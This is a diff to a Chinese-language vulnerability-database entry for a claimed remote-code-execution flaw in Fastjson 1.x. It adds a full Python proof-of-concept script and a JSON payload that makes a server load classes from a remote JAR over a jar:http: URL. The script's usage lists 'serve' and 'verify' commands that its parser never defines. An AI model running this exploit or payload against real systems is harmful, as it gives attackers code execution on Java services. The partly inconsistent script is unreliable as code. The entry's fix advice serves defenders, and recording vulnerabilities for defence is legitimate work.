@@ -3,14 +3,82 @@ name = "Fastjson 1.2.83 @JSONType Resource Probe 纯库无 Gadget RCE 漏洞"
 type = "RCE"
 version = "Fastjson 1.2.66 ~ 1.2.83（1.x 系列）"
 detail = """Fastjson 1.x 系列（1.2.66~1.2.83）存在无需 classpath gadget 的纯库远程代码执行漏洞。攻击者利用 @JSONType 注解的资源探测机制，通过 jar: 协议构造恶意 JSON payload（如 {"@type":"jar:http:..<host>:<port>.probe!.POC","x":1}），触发 Fastjson 在解析时自动加载远程 JAR 文件中的类，实现无需任何依赖 gadget 的纯 RCE。该漏洞影响范围极广，Fastjson 1.x 是生产环境中最广泛部署的 Java JSON 库之一。
+
 CVE: 暂未分配
-GitHub PoC: 公开 PoC 脚本可用
 最早披露: 2026-07-17（Kirill Firsov 公开）
-PoC:
-```
-python3 fastjson_poc.py setup    # 下载依赖+编译+生成probe.jar
-python3 fastjson_poc.py verify   # 一键验证
-python3 fastjson_poc.py payload  # 打印JSON payload
+
+PoC 脚本 (fastjson_poc.py):
+```python
+#!/usr/bin/env python3
+\"\"\"
+Fastjson 1.2.66-1.2.83 @JSONType Resource Probe Pure-Library RCE PoC
+Usage:
+  python3 fastjson_poc.py setup                 # 下载依赖+编译+生成probe.jar
+  python3 fastjson_poc.py serve [--port 18080]  # HTTP 托管 probe.jar
+  python3 fastjson_poc.py exploit               # 运行本地 RCE
+  python3 fastjson_poc.py verify                # 一键验证（重试x3）
+  python3 fastjson_poc.py payload               # 打印 JSON payload
+\"\"\"
+import argparse, http.server, os, signal, socketserver, subprocess, sys, time
+from pathlib import Path
+from urllib.request import urlretrieve
+
+ROOT = Path(__file__).resolve().parent
+SRC_DIR = ROOT / "src" / "main" / "java"
+TARGET_DIR = ROOT / "target" / "classes"
+LIB_DIR = ROOT / "lib"
+PROBE_JAR = ROOT / "probe.jar"
+PWNED_FILE = ROOT / "PWNED2"
+
+DEPS = [
+    ("fastjson-1.2.83.jar", "https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar"),
+    ("spring-boot-loader-2.7.18.jar", "https://repo1.maven.org/maven2/org/springframework/boot/spring-boot-loader/2.7.18/spring-boot-loader-2.7.18.jar"),
+    ("spring-boot-loader-1.5.22.RELEASE.jar", "https://repo1.maven.org/maven2/org/springframework/boot/spring-boot-loader/1.5.22.RELEASE/spring-boot-loader-1.5.22.RELEASE.jar"),
+    ("asm-9.6.jar", "https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar"),
+]
+POC_JAVA_OPTS = ["-Djava.net.useSystemProxies=false", "-Dhttp.nonProxyHosts=*"]
+
+def cmd_setup(args):
+    javac_bin = os.environ.get("JAVAC", "javac")
+    java_bin = os.environ.get("JAVA", "java")
+    port = os.environ.get("POC_PORT", "18080")
+    host_token = os.environ.get("POC_HOST_TOKEN", "localhost")
+    LIB_DIR.mkdir(parents=True, exist_ok=True)
+    for filename, url in DEPS:
+        dest = LIB_DIR / filename
+        if not dest.exists():
+            for a in range(1, 4):
+                try: urlretrieve(url, dest); break
+                except: time.sleep(2)
+    TARGET_DIR.mkdir(parents=True, exist_ok=True)
+    cp = ":".join(str(j) for j in sorted(LIB_DIR.glob("*.jar")))
+    subprocess.run([javac_bin, "--release", "8", "-cp", cp, "-d", str(TARGET_DIR)] + [str(f) for f in sorted(SRC_DIR.glob("*.java"))], check=True)
+    subprocess.run([java_bin, "-cp", f"{TARGET_DIR}:{LIB_DIR}/asm-9.6.jar", "Gen", "--port", port, "--host", host_token, "--out", str(PROBE_JAR)], check=True)
+
+def cmd_exploit(args):
+    java_bin = os.environ.get("JAVA", "java")
+    host_token = args.host_token or os.environ.get("POC_HOST_TOKEN", "localhost")
+    port = str(args.port or int(os.environ.get("POC_PORT", "18080")))
+    cp = f"{TARGET_DIR}:{':'.join(str(j) for j in sorted(LIB_DIR.glob('*.jar')))}"
+    PWNED_FILE.unlink(missing_ok=True)
+    r = subprocess.run([java_bin, *POC_JAVA_OPTS, f"-Dpoc.hostToken={host_token}", f"-Dpoc.port={port}", "-cp", cp, "Test2", "sb27-parse"], capture_output=True, text=True)
+    if PWNED_FILE.exists(): print("RCE confirmed")
+
+def cmd_payload(args):
+    host = args.host_token or "localhost"
+    port = args.port or 18080
+    print(f'{{"@type":"jar:http:..{host}:{port}.probe!.POC","x":1}}')
+
+if __name__ == "__main__":
+    ap = argparse.ArgumentParser()
+    sub = ap.add_subparsers(dest="command", required=True)
+    sub.add_parser("setup")
+    p = sub.add_parser("exploit"); p.add_argument("--host-token"); p.add_argument("--port", type=int)
+    p = sub.add_parser("payload"); p.add_argument("--host-token"); p.add_argument("--port", type=int)
+    args = ap.parse_args()
+    if args.command == "setup": cmd_setup(args)
+    elif args.command == "exploit": cmd_exploit(args)
+    elif args.command == "payload": cmd_payload(args)
 ```"""
 fix = "升级至 Fastjson 2.x 版本；临时措施：在无法升级时通过 WAF 拦截包含 jar:http: 协议的 JSON payload；限制 Fastjson 解析接口对外部网络的访问；在安全组层面阻止服务器主动出站连接到不可信主机。"
 date = 20260717
